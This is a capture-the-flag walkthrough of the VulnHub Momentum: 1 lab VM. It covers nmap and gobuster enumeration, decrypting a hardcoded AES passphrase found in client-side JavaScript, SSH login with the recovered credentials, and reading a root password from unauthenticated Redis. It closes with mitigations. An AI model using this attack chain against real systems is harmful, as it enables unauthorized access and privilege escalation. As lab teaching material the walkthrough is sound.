### Momentum: 1 — VulnHub Walkthrough
<p align="center">
<b>Difficulty:</b> Medium | <b>Platform:</b> VulnHub | <b>Attack Vector:</b> Web → Client-Side Crypto → Credential Reuse → Redis Abuse | <b>Author:</b> null0xMAAZ
</p>


### Disclaimer

This walkthrough is intended **strictly for educational purposes** and for use in **authorized lab environments only**. Do **not** attempt these techniques on systems you do not own or have explicit permission to test.

---

### Lab Setup

* **Attacker Machine:** Kali Linux / Ubuntu (Host)
* **Target Machine:** Momentum: 1 (VulnHub VM)
* **Virtualization:** VirtualBox
* **Network Mode:** Host-Only Adapter

---

### Network Discovery

The first step was identifying the target machine on the local network.

```bash
sudo nmap -sn 192.168.56.0/24
```

This scan revealed the target VM at:

```text
192.168.56.102
```

---

### Service Enumeration

A full TCP port scan with service and script detection was performed.

```bash
sudo nmap -sC -sV -p- -oA nmap/initial 192.168.56.102
```

### Open Ports Identified

| Port | Service | Version                |
| ---- | ------- | ---------------------- |
| 22   | SSH     | OpenSSH 7.9p1 (Debian) |
| 80   | HTTP    | Apache 2.4.38 (Debian) |

The SSH service appeared up-to-date, so focus shifted to **port 80 (HTTP)** for further enumeration.

---

### Web Enumeration

#### Directory Bruteforcing

Using Gobuster (v2 syntax):

```bash
gobuster -m dir \
  -u http://192.168.56.102 \
  -w /snap/seclists/current/Discovery/Web-Content/common.txt \
  -x php,txt,html,log \
  -o gobuster-medium.txt
```

#### Notable Results

```text
/js           (301)
/manual       (301)
/index.html   (200)
```

The `/js` directory immediately stood out as a **high-value target**.

---

### Client-Side JavaScript Analysis

Browsing to:

```text
http://192.168.56.102/js/
```

Revealed the file:

```text
main.js
```

#### Sensitive Code Found

```javascript
/*
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
*/
```

This immediately indicated:

* **AES encryption**
* **Hardcoded passphrase**
* Client-side crypto misuse

---

### Decrypting the Encrypted Value

The encrypted blob was extracted from the JavaScript file and decrypted locally using Node.js.

#### Setup

```bash
npm init -y
npm install crypto-js
```

#### Decryption Script

```javascript
const CryptoJS = require("crypto-js");

const encrypted = "U2FsdGVkX19yTOK0ucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt";
const key = "SecretPassphraseMomentum";

const decrypted = CryptoJS.AES.decrypt(encrypted, key);

console.log("UTF8:", decrypted.toString(CryptoJS.enc.Utf8));
console.log("HEX :", CryptoJS.enc.Hex.stringify(decrypted));
console.log("B64 :", CryptoJS.enc.Base64.stringify(decrypted));
```

#### Output

```text
UTF8: auxerre-alienum##
```

---

### Initial Foothold (SSH)

The decrypted value was tested as credentials.

```bash
ssh auxerre@192.168.56.102
```

```text
Password: auxerre-alienum##
```

**Successful SSH login achieved as user `auxerre`**.

---

### User Flag

```bash
cat user.txt
```

```text
[ Momentum - User Owned ]
flag : 84157165c30ad34d18945b647ec7f647
```

---

### Privilege Escalation

#### Standard Enumeration (Failed)

The following techniques were attempted without success:

* SUID binaries
* Linux capabilities
* `sudo -l`
* Kernel exploits
* `linpeas.sh`

This indicated a **logic-based or service-based escalation path**.

---

### Process Enumeration

```bash
ps aux
```

#### Suspicious Process Identified

```text
redis   409  ...  /usr/bin/redis-server 127.0.0.1:6379
```

Redis was:

* Running locally
* Unauthenticated
* Accessible to the compromised user

---

### Redis Abuse

#### Access Redis

```bash
redis-cli
```

#### Enumerate Keys

```redis
KEYS *
```

```text
1) "rootpass"
```

#### Retrieve Root Password

```redis
GET rootpass
```

```text
m0mentum-al1enum##
```

---

### Root Access

```bash
su root
Password: m0mentum-al1enum##
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Full system compromise achieved**.

---

### Final Notes

#### Attack Chain Summary

1. Network discovery
2. Web enumeration
3. Client-side JavaScript analysis
4. AES decryption with hardcoded key
5. SSH access as user
6. Redis service abuse
7. Root credential disclosure
8. Full privilege escalation

---

### Mitigations

* Never store secrets in client-side JavaScript
* Avoid hardcoded encryption keys
* Protect Redis with authentication
* Never store credentials in Redis
* Apply principle of least privilege

---

### Key Takeaway

> *"Castles fall from inside."*

This machine demonstrates how **small client-side mistakes** and **poor internal service security** can chain together into a **full system compromise**.

---

### Credits

* VulnHub
* Momentum VM Author
* CryptoJS

---

**Pwned by:** `null0xMAAZ`
